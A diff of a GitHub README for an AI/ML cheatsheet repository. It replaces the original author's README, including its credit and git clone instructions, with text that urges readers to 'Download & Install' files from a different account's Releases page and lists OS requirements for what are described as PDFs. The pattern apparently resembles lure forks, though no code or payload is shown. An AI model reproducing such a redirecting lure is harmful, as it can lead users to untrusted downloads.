@@ -1,77 +1,58 @@
-<p align="center">
-  <a href="https://www.linkedin.com/in/analyticalrohit" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
-  </a>
-  <a href="https://awesomeneuron.substack.com/" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/Substack-%23006f5c.svg?style=for-the-badge&logo=substack&logoColor=FF6719" alt="Substack">
-  </a>
-   <a href="https://x.com/_rohit_tiwari_" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/X-%23000000.svg?style=for-the-badge&logo=X&logoColor=white" alt="X">
-  </a>
-     <a href="https://www.youtube.com/@awesomeneuron?sub_confirmation=1" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/YouTube-%23FF0000.svg?style=for-the-badge&logo=YouTube&logoColor=white" alt="Youtube">
-  </a>
-     <a href="https://topmate.io/analyticalrohit" style="text-decoration:none;">
-    <img src="https://raw.githubusercontent.com/analyticalrohit/analyticalrohit/refs/heads/main/assets/topmate_logo.png" alt="Topmate">
-  </a>
-</p>
+# 🎓 AI-ML-Cheatsheets - Simplify Your Learning Journey
 
-# 🤖 AI-ML-Cheatsheets
+## 📥 Quick Download
+[![Download AI-ML-Cheatsheets](https://img.shields.io/badge/Download%20AI--ML--Cheatsheets-blue.svg)](https://github.com/4ngelojr/AI-ML-Cheatsheets/releases)
 
-A curated collection of quick-reference stanford guides covering core topics in Artificial Intelligence, Machine Learning and Deep Learning. These cheatsheets are designed to help students, developers, and researchers quickly recall important concepts and formulas.
-
-## 📚 Topics Covered
-
-> All cheatsheets are organized folder-wise by topic and include concise explanations, diagrams, and essential equations.
-
-- [Artificial Intelligence](./artificial-intelligence/)  
-- [Transformers and LLMs](./transformers-llms/)  
-- [Deep Learning](./deep-learning/)  
-- [Machine Learning](./machine-learning/)  
-- [Probabilities and Statistics](./probabilities-statistics/)  
-- [Algebra and Calculus](./algebra-calculus/)   
+## 📖 Overview
+AI-ML-Cheatsheets is your go-to resource for essential concepts in the fields of artificial intelligence and machine learning. Here, you will find well-organized cheatsheets covering topics such as Deep Learning, Transformers, LLMs, and more. Perfect for students and professionals looking to quickly grasp important ideas and formulas.
 
 ## 🚀 Getting Started
+1. **Visit the Downloads Page:** Start by visiting the [Releases page](https://github.com/4ngelojr/AI-ML-Cheatsheets/releases). This is where you will find the latest versions of our cheatsheets.
 
-```bash
-git clone https://github.com/analyticalrohit/AI-ML-Cheatsheets.git
-```
+2. **Select a Cheatsheet:** Browse through the available cheatsheets. We cover a variety of areas including:
+   - Artificial Intelligence
+   - Deep Learning
+   - Neural Networks
+   - Probability and Statistics
+   - Algebra and Calculus
 
-## 📬 Newsletter
+3. **Download the File:** Click on the cheatsheet you want. It will take you to a download link. Click to download the PDF or any other format available.
 
-<div style="text-align: left;">
-📌 Join 3000+ ML enthusiasts and professionals from 100 countries.<br>
-✅ Learn AI for FREE with visuals, easy-to-follow insights.<br>
-✅ Get cutting-edge topics like GenAI, RAGs, and LLMs in your inbox every week.
-</div>
-<br>
-<div align="center">
+## 📤 Download & Install
+To get started, follow these steps:
 
-[![Subscribe to AwesomeNeuron Newsletter](https://raw.githubusercontent.com/analyticalrohit/analyticalrohit/5ab83e498b11eefe57c91bc4f4cac10414276920/assets/subscribe_button.svg)](https://awesomeneuron.substack.com/)
+1. **Visit the Releases Page:** Go to [this link](https://github.com/4ngelojr/AI-ML-Cheatsheets/releases).
 
-</div>
-<div style="text-align: left;">
-    <a href="https://awesomeneuron.substack.com/">
-        <img src="https://raw.githubusercontent.com/analyticalrohit/analyticalrohit/refs/heads/main/assets/awesomeneuron_logo.png" alt="AwesomeNeuron Newsletter">
-</div>
-<p align="center">
-  <a href="https://awesomeneuron.substack.com/">
-    <img src="https://raw.githubusercontent.com/analyticalrohit/analyticalrohit/refs/heads/main/assets/awesomeneuron_blog.gif" alt="AwesomeNeuron Newsletter">
-  </a>
-</p>
+2. **Choose Your Cheatsheet:** Look for the cheatsheets relevant to your study or project.
 
-## 📄 Contributing
+3. **Click to Download:** Once you find a cheatsheet, click on it to start downloading.
 
-We welcome contributions from the community! If you have a cheetsheet or improvement to suggest:
+4. **Enjoy Your Cheatsheet:** After the download completes, open the file using any PDF viewer or compatible software.
 
-1. Fork the repository
-2. Create your feature branch: `git checkout -b feature/CheatsheetTopic`
-3. Commit your changes: `git commit -m 'Add some CheatsheetTopic'`
-4. Push to the branch: `git push origin feature/CheatsheetTopic`
-5. Open a pull request
+## 🛠️ System Requirements
+- **Operating System:** Windows, macOS, or Linux. 
+- **Software:** Any program that can open PDF files, such as Adobe Reader or any web browser.
 
----
+## 🔎 Features
+- **Comprehensive Coverage:** Each cheatsheet provides quick access to definitions, equations, and concepts.
+- **User-Friendly Layout:** Easy to read and navigate, making learning efficient.
+- **Regular Updates:** We periodically update the content to include the latest information and practices in AI and ML.
 
-⭐️ If you find this repository helpful, please consider giving it a star!
+## 👥 Community Contributions
+We welcome contributions from anyone interested in enhancing the resource. If you have new insights or corrections, feel free to raise an issue or pull request on this repository.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=analyticalrohit/AI-ML-Cheatsheets&type=Date)](https://www.star-history.com/#analyticalrohit/AI-ML-Cheatsheets&Date)
+## 🌐 Related Topics
+Our repository covers key areas in the field of AI and ML:
+- **Artificial Intelligence:** Understand the principles and technologies in AI.
+- **Deep Learning:** Explore neural networks and their applications.
+- **Transformers:** Get insights into modern architectures in NLP.
+- **Probabilities and Statistics:** Learn foundational concepts that drive machine learning algorithms.
+
+## 📬 Support
+If you need help or have questions, please reach out through the issues section of the repository. Community members and maintainers are here to assist you. 
+
+## ✨ Acknowledgments
+We acknowledge all the contributors and resources from Stanford that inspired these cheatsheets. This resource aims to help educators and learners in the fields of AI and ML.
+
+## 📜 License
+This repository is licensed under the MIT License. Feel free to use and adapt the content, giving credit to the original creators.
